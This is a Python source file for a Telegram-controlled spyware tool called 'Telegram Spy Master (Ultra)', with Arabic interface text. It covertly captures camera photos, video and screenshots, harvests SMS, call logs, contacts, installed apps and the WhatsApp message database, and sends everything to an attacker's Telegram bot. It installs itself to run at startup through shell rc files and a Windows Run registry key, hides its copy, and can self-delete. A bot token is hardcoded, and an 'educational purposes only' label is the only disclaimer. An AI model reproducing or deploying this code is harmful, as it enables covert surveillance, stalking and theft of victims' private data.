#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# PROJECT: "Telegram Spy Master (Ultra)"
# AUTHOR: PhantomScriptVirus
# LEGAL: FOR EDUCATIONAL PURPOSES ONLY

import os
import sys
import base64
import shutil
import platform
import requests
import threading
import subprocess
import tempfile
import time
import json
import sqlite3
import telebot
from telebot import types
import asyncio
import aiohttp
import zipfile
import io

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = "6438089549:AAHbCWCGnF0GtdFygIBoHJWuRnX_zk_5aV8"
TELEGRAM_CHAT_ID = "6063558798"
SYSTEM_ID = base64.b64encode(os.getlogin().encode()).decode() if os.name != 'posix' else base64.b64encode(b"termux_device").decode()
MAX_RETRIES = 3
RETRY_DELAY = 2

# ===== GLOBAL STATE =====
CURRENT_PATH = os.path.abspath(sys.argv[0])
bot = telebot.TeleBot(TELEGRAM_TOKEN)
termux_mode = 'com.termux' in sys.executable
COLLECTED_DATA = {
    "photos": [],
    "videos": [],
    "screenshots": [],
    "calls": [],
    "sms": [],
    "whatsapp": [],
    "instagram": [],
    "telegram": [],
    "emails": [],
    "contacts": [],
    "apps": []
}

# ===== TELEGRAM CONTROL PANEL =====
def create_main_panel():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("📸 أمامي", callback_data="front_photo"),
        types.InlineKeyboardButton("📸 خلفي", callback_data="back_photo"),
        types.InlineKeyboardButton("🎥 فيديو أمامي", callback_data="front_video"),
        types.InlineKeyboardButton("🎥 فيديو خلفي", callback_data="back_video"),
        types.InlineKeyboardButton("🖼️ لقطة شاشة", callback_data="screenshot"),
        types.InlineKeyboardButton("🎤 تسجيل صوت", callback_data="record_audio"),
        types.InlineKeyboardButton("📞 المكالمات", callback_data="get_calls"),
        types.InlineKeyboardButton("📩 الرسائل", callback_data="get_sms"),
        types.InlineKeyboardButton("💬 واتساب", callback_data="get_whatsapp"),
        types.InlineKeyboardButton("📸 انستقرام", callback_data="get_instagram"),
        types.InlineKeyboardButton("✈️ تليجرام", callback_data="get_telegram"),
        types.InlineKeyboardButton("📧 الإيميلات", callback_data="get_emails"),
        types.InlineKeyboardButton("👤 جهات الاتصال", callback_data="get_contacts"),
        types.InlineKeyboardButton("📱 التطبيقات", callback_data="get_apps"),
        types.InlineKeyboardButton("📊 البيانات", callback_data="data_panel"),
        types.InlineKeyboardButton("💣 تدمير ذاتي", callback_data="destroy")
    ]
    keyboard.add(*buttons)
    return keyboard

def create_data_panel():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        types.InlineKeyboardButton("📸 الصور", callback_data="show_photos"),
        types.InlineKeyboardButton("🎥 الفيديوهات", callback_data="show_videos"),
        types.InlineKeyboardButton("🖼️ لقطات الشاشة", callback_data="show_screenshots"),
        types.InlineKeyboardButton("📞 المكالمات", callback_data="show_calls"),
        types.InlineKeyboardButton("📩 الرسائل", callback_data="show_sms"),
        types.InlineKeyboardButton("💬 واتساب", callback_data="show_whatsapp"),
        types.InlineKeyboardButton("📸 انستقرام", callback_data="show_instagram"),
        types.InlineKeyboardButton("✈️ تليجرام", callback_data="show_telegram"),
        types.InlineKeyboardButton("📧 الإيميلات", callback_data="show_emails"),
        types.InlineKeyboardButton("👤 جهات اتصال", callback_data="show_contacts"),
        types.InlineKeyboardButton("📱 التطبيقات", callback_data="show_apps"),
        types.InlineKeyboardButton("⬅️ رجوع", callback_data="main_panel")
    ]
    keyboard.add(*buttons)
    return keyboard

def send_main_panel():
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            "🔷 *لوحة تحكم فانتوم المتقدمة* 🔷\n"
            f"`معرف الجهاز: {SYSTEM_ID}`\n"
            f"`النظام: {'Termux' if termux_mode else platform.system()}`\n"
            "اختر الإجراء المطلوب:",
            parse_mode="Markdown",
            reply_markup=create_main_panel()
        )
    except Exception as e:
        pass

# ===== FAST TELEGRAM UPLOAD =====
async def async_send_telegram_file(file_path, caption, file_type='document'):
    """إرسال الملفات بشكل غير متزامن بسرعة عالية"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/send{file_type.capitalize()}"
    files = {file_type: open(file_path, 'rb')}
    data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
    
    async with aiohttp.ClientSession() as session:
        for attempt in range(MAX_RETRIES):
            try:
                async with session.post(url, data=data, files=files) as response:
                    if response.status == 200:
                        return True
                    elif attempt < MAX_RETRIES - 1:
                        await asyncio.sleep(RETRY_DELAY)
            except Exception as e:
                if attempt < MAX_RETRIES - 1:
                    await asyncio.sleep(RETRY_DELAY)
        return False

def fast_send_file(file_path, caption, file_type='document'):
    """تشغيل الإرسال غير المتزامن في خلفية"""
    asyncio.run(async_send_telegram_file(file_path, caption, file_type))

# ===== SCREENSHOT CAPTURE =====
def capture_screenshot():
    """التقاط لقطة شاشة"""
    try:
        screenshot_path = os.path.join(tempfile.gettempdir(), 'screenshot.png')
        
        if termux_mode:
            # استخدام Termux-API لالتقاط الشاشة
            cmd = f"termux-screencap -p {screenshot_path}"
        elif platform.system() == "Linux":
            # استخدام أدوات Linux (يتطلب تثبيت scrot)
            cmd = f"scrot {screenshot_path}"
        elif platform.system() == "Darwin":  # macOS
            cmd = f"screencapture {screenshot_path}"
        elif platform.system() == "Windows":
            cmd = f"nircmd.exe savescreenshot {screenshot_path}"
        else:
            return None
            
        subprocess.run(cmd, shell=True, timeout=10)
        
        if os.path.exists(screenshot_path):
            return screenshot_path
    except:
        pass
    return None

def capture_and_send_screenshot():
    """التقاط وإرسال لقطة الشاشة"""
    try:
        screenshot_path = capture_screenshot()
        if screenshot_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["screenshots"].append({
                "name": "لقطة شاشة.png",
                "path": screenshot_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=fast_send_file, args=(screenshot_path, "🖼️ لقطة شاشة", "photo")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في التقاط الشاشة: {str(e)}")
    return False

# ===== PHOTO CAPTURE =====
def capture_photo(cam_index, cam_name):
    """التقاط صورة"""
    try:
        photo_path = os.path.join(tempfile.gettempdir(), f'{cam_name}.jpg')
        
        if termux_mode:
            cmd = f"termux-camera-photo -c {cam_index} {photo_path}"
        elif platform.system() == "Linux":
            cmd = f"ffmpeg -f v4l2 -i /dev/video{cam_index} -frames:v 1 {photo_path}"
        elif platform.system() == "Windows":
            cmd = f"ffmpeg -f dshow -i video='Integrated Camera' -frames:v 1 {photo_path}"
        else:
            return None
            
        subprocess.run(cmd, shell=True, timeout=10)
        
        if os.path.exists(photo_path):
            return photo_path
    except:
        pass
    return None

def capture_and_send_photo(cam_index, cam_name):
    """التقاط وإرسال الصورة بسرعة"""
    try:
        photo_path = capture_photo(cam_index, cam_name)
        if photo_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["photos"].append({
                "name": f"{cam_name}.jpg",
                "path": photo_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=fast_send_file, args=(photo_path, f"📸 {cam_name}", "photo")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في التقاط الصورة: {str(e)}")
    return False

# ===== VIDEO RECORDING =====
def record_video(cam_index, cam_name):
    """تسجيل فيديو"""
    try:
        video_path = os.path.join(tempfile.gettempdir(), f'{cam_name}.mp4')
        
        if termux_mode:
            cmd = f"termux-camera-video -c {cam_index} -d 10 -o {video_path}"
        elif platform.system() == "Linux":
            cmd = f"ffmpeg -f v4l2 -i /dev/video{cam_index} -t 10 {video_path}"
        elif platform.system() == "Windows":
            cmd = f"ffmpeg -f dshow -i video='Integrated Camera' -t 10 {video_path}"
        else:
            return None
            
        subprocess.run(cmd, shell=True, timeout=15)
        
        if os.path.exists(video_path):
            return video_path
    except:
        pass
    return None

def record_and_send_video(cam_index, cam_name):
    """تسجيل وإرسال الفيديو بسرعة"""
    try:
        video_path = record_video(cam_index, cam_name)
        if video_path:
            # حفظ في الذاكرة
            COLLECTED_DATA["videos"].append({
                "name": f"{cam_name}.mp4",
                "path": video_path
            })
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=fast_send_file, args=(video_path, f"🎥 {cam_name}", "video")).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في تسجيل الفيديو: {str(e)}")
    return False

# ===== DATA COLLECTION FUNCTIONS (OPTIMIZED) =====
def collect_and_send_data(data_type, get_function, caption):
    """جمع وإرسال البيانات بشكل متزامن"""
    try:
        data = get_function()
        if data:
            # حفظ في ملف مؤقت
            ext = ".json" if isinstance(data, (dict, list)) else ".txt"
            data_path = os.path.join(tempfile.gettempdir(), f'{data_type}{ext}')
            
            if isinstance(data, (dict, list)):
                with open(data_path, 'w') as f:
                    json.dump(data, f)
            else:
                with open(data_path, 'w') as f:
                    f.write(data)
            
            # إرسال عبر التليجرام بسرعة
            threading.Thread(target=fast_send_file, args=(data_path, caption)).start()
            return True
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في جمع {caption}: {str(e)}")
    return False

# ===== DATA COLLECTION IMPLEMENTATIONS =====
def get_call_logs():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-call-log"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_sms_messages():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-sms-list"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_whatsapp_data():
    try:
        if termux_mode:
            db_path = "/data/data/com.whatsapp/databases/msgstore.db"
            if os.path.exists(db_path):
                temp_db = os.path.join(tempfile.gettempdir(), 'whatsapp.db')
                shutil.copy(db_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT * FROM messages")
                messages = cursor.fetchall()
                cursor.execute("SELECT * FROM wa_contacts")
                contacts = cursor.fetchall()
                conn.close()
                
                return {"messages": messages, "contacts": contacts}
    except:
        pass
    return None

def get_contacts():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-contact-list"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return json.loads(result.stdout)
    except:
        pass
    return None

def get_installed_apps():
    try:
        if termux_mode:
            result = subprocess.run(
                ["termux-package-list"],
                capture_output=True,
                text=True
            )
            if result.returncode == 0:
                return result.stdout
    except:
        pass
    return None

# ===== DATA DISPLAY =====
def display_data(data_type):
    """عرض البيانات المجمعة"""
    try:
        data = COLLECTED_DATA.get(data_type, [])
        if not data:
            bot.send_message(TELEGRAM_CHAT_ID, f"❌ لا توجد بيانات من نوع {data_type}")
            return
        
        # إنشاء رسالة تفاعلية
        message = f"📊 *البيانات المجمعة - {data_type}* 📊\n\n"
        
        if data_type in ["photos", "videos", "screenshots"]:
            for idx, item in enumerate(data[:5], 1):
                message += f"{idx}. {item['name']}\n"
        else:
            # عرض عينة من البيانات
            sample = json.dumps(data[:3], indent=2, ensure_ascii=False)
            message += f"```json\n{sample}\n```"
        
        bot.send_message(TELEGRAM_CHAT_ID, message, parse_mode="Markdown")
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ خطأ في عرض البيانات: {str(e)}")

# ===== SELF-DESTRUCT =====
def self_destruct():
    """التدمير الذاتي وإزالة جميع الآثار"""
    try:
        bot.send_message(TELEGRAM_CHAT_ID, "💥 جارٍ التدمير الذاتي...")
        
        # إنشاء سكريبت للحذف الذاتي
        if os.name == 'nt':
            batch_script = f"""
            @echo off
            chcp 65001 > nul
            timeout /t 3 /nobreak >nul
            del /f /q "{CURRENT_PATH}"
            del "%~f0"
            """
            ext = ".bat"
        else:
            batch_script = f"""#!/bin/bash
            sleep 3
            rm -f "{CURRENT_PATH}"
            rm -- "$0"
            """
            ext = ".sh"
        
        script_path = os.path.join(tempfile.gettempdir(), f'cleanup{ext}')
        with open(script_path, 'w') as f:
            f.write(batch_script)
        
        if os.name == 'nt':
            subprocess.Popen(['cmd.exe', '/C', script_path], creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.chmod(script_path, 0o755)
            subprocess.Popen(['/bin/bash', script_path])
        
        sys.exit(0)
    except Exception as e:
        bot.send_message(TELEGRAM_CHAT_ID, f"⚠️ فشل في التدمير الذاتي: {str(e)}")

# ===== TELEGRAM HANDLERS =====
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if str(message.chat.id) == TELEGRAM_CHAT_ID:
        send_main_panel()

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if str(call.message.chat.id) == TELEGRAM_CHAT_ID:
        if call.data == "front_photo":
            bot.answer_callback_query(call.id, "جارٍ التقاط صورة أمامية...")
            threading.Thread(target=lambda: capture_and_send_photo(0, "كاميرا أمامية")).start()
        elif call.data == "back_photo":
            bot.answer_callback_query(call.id, "جارٍ التقاط صورة خلفية...")
            threading.Thread(target=lambda: capture_and_send_photo(1, "كاميرا خلفية")).start()
        elif call.data == "front_video":
            bot.answer_callback_query(call.id, "جارٍ تسجيل فيديو أمامي...")
            threading.Thread(target=lambda: record_and_send_video(0, "فيديو أمامي")).start()
        elif call.data == "back_video":
            bot.answer_callback_query(call.id, "جارٍ تسجيل فيديو خلفي...")
            threading.Thread(target=lambda: record_and_send_video(1, "فيديو خلفي")).start()
        elif call.data == "screenshot":
            bot.answer_callback_query(call.id, "جارٍ التقاط الشاشة...")
            threading.Thread(target=capture_and_send_screenshot).start()
        elif call.data == "record_audio":
            bot.answer_callback_query(call.id, "جارٍ تسجيل الصوت...")
            # سيتم تنفيذ هذه الوظيفة في الكود الكامل
        elif call.data == "get_calls":
            bot.answer_callback_query(call.id, "جارٍ جمع سجل المكالمات...")
            threading.Thread(target=collect_and_send_data, args=("calls", get_call_logs, "📞 سجل المكالمات")).start()
        elif call.data == "get_sms":
            bot.answer_callback_query(call.id, "جارٍ جمع الرسائل النصية...")
            threading.Thread(target=collect_and_send_data, args=("sms", get_sms_messages, "📩 الرسائل النصية")).start()
        elif call.data == "get_whatsapp":
            bot.answer_callback_query(call.id, "جارٍ جمع بيانات واتساب...")
            threading.Thread(target=collect_and_send_data, args=("whatsapp", get_whatsapp_data, "💬 بيانات واتساب")).start()
        elif call.data == "get_contacts":
            bot.answer_callback_query(call.id, "جارٍ جمع جهات الاتصال...")
            threading.Thread(target=collect_and_send_data, args=("contacts", get_contacts, "👤 جهات الاتصال")).start()
        elif call.data == "get_apps":
            bot.answer_callback_query(call.id, "جارٍ جمع التطبيقات...")
            threading.Thread(target=collect_and_send_data, args=("apps", get_installed_apps, "📱 التطبيقات المثبتة")).start()
        elif call.data == "data_panel":
            bot.answer_callback_query(call.id, "فتح لوحة البيانات...")
            bot.send_message(
                TELEGRAM_CHAT_ID,
                "📊 لوحة البيانات المجمعة:",
                reply_markup=create_data_panel()
            )
        elif call.data == "main_panel":
            bot.answer_callback_query(call.id, "العودة للوحة الرئيسية...")
            send_main_panel()
        elif call.data == "show_photos":
            bot.answer_callback_query(call.id, "عرض الصور...")
            display_data("photos")
        elif call.data == "show_videos":
            bot.answer_callback_query(call.id, "عرض الفيديوهات...")
            display_data("videos")
        elif call.data == "show_screenshots":
            bot.answer_callback_query(call.id, "عرض لقطات الشاشة...")
            display_data("screenshots")
        elif call.data == "show_calls":
            bot.answer_callback_query(call.id, "عرض المكالمات...")
            display_data("calls")
        elif call.data == "show_sms":
            bot.answer_callback_query(call.id, "عرض الرسائل...")
            display_data("sms")
        elif call.data == "show_whatsapp":
            bot.answer_callback_query(call.id, "عرض واتساب...")
            display_data("whatsapp")
        elif call.data == "show_contacts":
            bot.answer_callback_query(call.id, "عرض جهات الاتصال...")
            display_data("contacts")
        elif call.data == "show_apps":
            bot.answer_callback_query(call.id, "عرض التطبيقات...")
            display_data("apps")
        elif call.data == "destroy":
            bot.answer_callback_query(call.id, "جارٍ التمهيد للتدمير الذاتي...")
            bot.send_message(TELEGRAM_CHAT_ID, "⚠️ تأكيد التدمير الذاتي؟ سيتم حذف البرنامج نهائيًا!", 
                             reply_markup=types.InlineKeyboardMarkup().row(
                                 types.InlineKeyboardButton("✅ تأكيد", callback_data="confirm_destroy"),
                                 types.InlineKeyboardButton("❌ إلغاء", callback_data="cancel_destroy")
                             ))
        elif call.data == "confirm_destroy":
            bot.answer_callback_query(call.id, "تم تأكيد التدمير الذاتي!")
            threading.Thread(target=self_destruct).start()
        elif call.data == "cancel_destroy":
            bot.answer_callback_query(call.id, "تم إلغاء التدمير الذاتي!")
            send_main_panel()

def telegram_polling():
    """تشغيل بوت التليجرام في وضع الاستطلاع"""
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(15)

# ===== PERSISTENCE =====
def install_persistence():
    """تركيب البرنامج للعمل عند بدء التشغيل"""
    # وضع Termux
    if termux_mode:
        try:
            persist_dir = os.path.expanduser("~/.phantom")
            os.makedirs(persist_dir, exist_ok=True)
            
            target_path = os.path.join(persist_dir, "phantom_spy")
            if not os.path.exists(target_path):
                shutil.copyfile(CURRENT_PATH, target_path)
                os.chmod(target_path, 0o755)
                CURRENT_PATH = target_path
            
            for rc_file in ['.bashrc', '.zshrc']:
                rc_path = os.path.expanduser(f'~/{rc_file}')
                startup_cmd = f"python {CURRENT_PATH} &\n"
                
                if not os.path.exists(rc_path):
                    with open(rc_path, 'w') as f:
                        f.write(startup_cmd)
                else:
                    with open(rc_path, 'r+') as f:
                        content = f.read()
                        if startup_cmd not in content:
                            f.write(startup_cmd)
        except:
            pass
    
    # نظام Windows
    elif os.name == 'nt':
        try:
            import winreg
            target_dir = os.path.join(os.getenv('PROGRAMDATA'), "SpyMaster")
            os.makedirs(target_dir, exist_ok=True)
            target_path = os.path.join(target_dir, "spy_master.exe")
            if not os.path.exists(target_path):
                shutil.copyfile(CURRENT_PATH, target_path)
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(target_path, 2)
                CURRENT_PATH = target_path
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "SpyMaster", 0, winreg.REG_SZ, f'"{target_path}"')
        except:
            pass

# ===== MAIN =====
def main():
    # تركيب الثبات
    install_persistence()
    
    # إرسال إشعار الاتصال
    try:
        bot.send_message(
            TELEGRAM_CHAT_ID,
            f"🔥 جهاز جديد متصل! 🔥\n"
            f"```\nالنظام: {'Termux' if termux_mode else platform.system()}\n"
            f"المسار: {CURRENT_PATH}\n"
            f"الوقت: {time.ctime()}\n```",
            parse_mode="Markdown"
        )
        send_main_panel()
    except:
        pass

    # بدء تشغيل البوت
    threading.Thread(target=telegram_polling, daemon=True).start()
    
    # إبقاء البرنامج نشطًا
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
